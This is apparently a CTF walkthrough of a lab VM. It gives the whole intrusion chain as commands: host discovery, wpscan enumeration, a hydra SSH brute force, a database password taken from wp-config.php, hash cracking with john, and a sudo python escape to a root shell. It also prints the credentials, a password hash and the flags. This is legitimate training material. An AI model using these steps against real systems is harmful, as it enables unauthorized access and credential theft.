# Walkthrough

This file contains my notes as I completed this CTF. Use my notes to help guide you.
ifconfig to get IP
netdiscover -r 192.168.56.0/24 -i eth1
nmap 192.168.56.103
firefox -> 192.168.56.103 to find IP of target
httrack 192.168.56.103 to have offline version of all online files
grep "html" *.html
	service.html:			<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->
wpscan --url http://192.168.56.103/wordpress -evt -evp -eu
hydra 192.168.56.103 -L users.txt -P /usr/share/wordlists/rockyou.txt ssh
ssh michael@192.168.56.103
cd /var/www/ , cat flag2.txt
	flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
cd html/wordpress
cat wp-config.php (// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

mysql -u root -p R@v3nSecurity
show databases;
use wordpress;
show tables;
select * from wp_posts; flag3{afc01ab56b50591e7dccf93122770cd2}
select * from wp_users;
steven password hash: $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
exit 2x
touch stevenHash.txt ; nano stevenHash.txt //copy PW in there
john stevenHash.txt -> returns pink84
ssh steven@192.168.56.103 -> PW = pink84
sudo -l (shows that you can run python)
sudo /usr/bin/python
	import os
	os.system('/bin/bash')
now have root access
cd root, cat flag4.txt

flag4{715dea6c055b9fe3337544932f2941ce}













